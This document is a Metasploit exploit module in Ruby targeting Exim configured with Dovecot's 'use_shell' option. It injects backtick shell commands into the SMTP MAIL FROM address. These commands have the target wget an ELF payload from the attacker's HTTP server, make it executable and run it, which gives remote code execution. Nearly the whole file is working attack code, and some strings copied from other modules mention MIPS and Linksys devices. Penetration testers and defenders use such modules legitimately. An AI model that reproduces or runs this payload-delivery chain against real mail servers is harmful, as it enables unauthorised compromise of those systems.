# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Smtp
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper


  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Exim and Dovecot Insecure Configuration Command Injection&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a command injection vulnerability against Dovecot with 
        Exim using the "use_shell" option. It uses the sender&#039;s address to inject arbitary
        commands since this is one of the user-controlled variables, which has been
        successfully tested on Debian Squeeze using the default Exim4 with dovecot-common
        packages.
      },
      &#039;Author&#039;         =>
        [
          &#039;Unknown&#039;, # From redteam-pentesting # Vulnerability Discovery and PoC
          &#039;eKKiM&#039;, # PoC
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;93004&#039; ],
          [ &#039;EDB&#039;, &#039;25297&#039; ],
          [ &#039;URL&#039;, &#039;https://www.redteam-pentesting.de/advisories/rt-sa-2013-001&#039; ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Linux x86&#039;, { }],
        ],
      &#039;DisclosureDate&#039; => &#039;May 03 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))

      register_options(
      [
        OptString.new(&#039;EHLO&#039;, [ true, &#039;TO address of the e-mail&#039;, &#039;debian.localdomain&#039;]),
        OptString.new(&#039;MAILTO&#039;, [ true, &#039;TO address of the e-mail&#039;, &#039;root@debian.localdomain&#039;]),
        OptAddress.new(&#039;DOWNHOST&#039;, [ false, &#039;An alternative host to request the MIPS payload from&#039; ]),
        OptString.new(&#039;DOWNFILE&#039;, [ false, &#039;Filename to download, (default: random)&#039; ]),
        OptPort.new(&#039;SRVPORT&#039;, [ true, &#039;The daemon port to listen on&#039;, 80 ]),
        OptInt.new(&#039;HTTP_DELAY&#039;, [true, &#039;Time that the HTTP Server will wait for the ELF payload request&#039;, 60])
      ], self.class)

      deregister_options(&#039;MAILFROM&#039;)
  end

  # wait for the data to be sent
  def wait_linux_payload
    print_status("#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...")

    waited = 0
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore[&#039;HTTP_DELAY&#039;])
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Target didn&#039;t request request the ELF payload -- Maybe it cant connect back to us?")
      end
    end
  end

  # Handle incoming requests from the server
  def on_request_uri(cli, request)
    if (not @pl)
      print_error("#{rhost}:#{rport} - A request came in, but the payload wasn&#039;t ready yet!")
      return
    end
    print_status("#{rhost}:#{rport} - Sending the payload to the server...")
    @elf_sent = true
    send_response(cli, @pl)
  end

  def exploit

    @pl = generate_payload_exe
    @elf_sent = false

    #
    # start our web server to deploy the final payload
    #
    downfile = datastore[&#039;DOWNFILE&#039;] || rand_text_alpha(8+rand(8))
    resource_uri = &#039;/&#039; + downfile

    if (datastore[&#039;DOWNHOST&#039;])
      service_url_payload = datastore[&#039;DOWNHOST&#039;] + resource_uri
    else

      # Needs to be on the port 80
      if datastore[&#039;SRVPORT&#039;].to_i != 80
        fail_with(Exploit::Failure::Unknown, &#039;The Web Server needs to live on SRVPORT=80&#039;)
      end

      #do not use SSL
      if datastore[&#039;SSL&#039;]
        ssl_restore = true
        datastore[&#039;SSL&#039;] = false
      end

      #we use SRVHOST as download IP for the coming wget command.
      #SRVHOST needs a real IP address of our download host
      if (datastore[&#039;SRVHOST&#039;] == "0.0.0.0" or datastore[&#039;SRVHOST&#039;] == "::")
        srv_host = Rex::Socket.source_address(rhost)
      else
        srv_host = datastore[&#039;SRVHOST&#039;]
      end

      service_url = &#039;http://&#039; + srv_host + &#039;:&#039; + datastore[&#039;SRVPORT&#039;].to_s + resource_uri
      service_url_payload = srv_host + resource_uri
      print_status("#{rhost}:#{rport} - Starting up our web service on #{service_url} ...")
      start_service({&#039;Uri&#039; => {
        &#039;Proc&#039; => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        &#039;Path&#039; => resource_uri
      }})

      datastore[&#039;SSL&#039;] = true if ssl_restore
    end


    connect

    print_status("#{rhost}:#{rport} - Server: #{self.banner.to_s.strip}")
    if self.banner.to_s !~ /Exim /
      disconnect
      fail_with(Exploit::Failure::NoTarget, "#{rhost}:#{rport} - The target server is not running Exim!")
    end

    ehlo = datastore[&#039;EHLO&#039;]
    ehlo_resp = raw_send_recv("EHLO #{ehlo}\r\n")
    ehlo_resp.each_line do |line|
      print_status("#{rhost}:#{rport} - EHLO: #{line.strip}")
    end

    #
    # Initiate the message
    #
    filename = rand_text_alpha_lower(8)
    from = rand_text_alpha(3)
    from << "`/usr/bin/wget${IFS}#{service_url_payload}${IFS}-O${IFS}/tmp/#{filename}`"
    from << "`chmod${IFS}+x${IFS}/tmp/#{filename}`"
    from << "`/tmp/#{filename}`"
    from << "@#{ehlo}"
    to   = datastore[&#039;MAILTO&#039;]

    resp = raw_send_recv("MAIL FROM: #{from}\r\n")
    resp ||= &#039;no response&#039;
    msg = "MAIL: #{resp.strip}"
    if not resp or resp[0,3] != &#039;250&#039;
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - #{msg}")
    else
      print_status("#{rhost}:#{rport} - #{msg}")
    end

    resp = raw_send_recv("RCPT TO: #{to}\r\n")
    resp ||= &#039;no response&#039;
    msg = "RCPT: #{resp.strip}"
    if not resp or resp[0,3] != &#039;250&#039;
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - #{msg}")
    else
      print_status("#{rhost}:#{rport} - #{msg}")
    end

    resp = raw_send_recv("DATA\r\n")
    resp ||= &#039;no response&#039;
    msg = "DATA: #{resp.strip}"
    if not resp or resp[0,3] != &#039;354&#039;
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - #{msg}")
    else
      print_status("#{rhost}:#{rport} - #{msg}")
    end

    message = "Subject: test\r\n"
    message <<  "\r\n"
    message << ".\r\n"

    resp = raw_send_recv(message)
    msg = "DELIVER: #{resp.strip}"
    if not resp or resp[0,3] != &#039;250&#039;
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - #{msg}")
    else
      print_status("#{rhost}:#{rport} - #{msg}")
    end
    disconnect

    # wait for payload download
    if (datastore[&#039;DOWNHOST&#039;])
      print_status("#{rhost}:#{rport} - Giving #{datastore[&#039;HTTP_DELAY&#039;]} seconds to the Linksys device to download the payload")
      select(nil, nil, nil, datastore[&#039;HTTP_DELAY&#039;])
    else
      wait_linux_payload
    end
    register_file_for_cleanup("/tmp/#{filename}")

  end

end

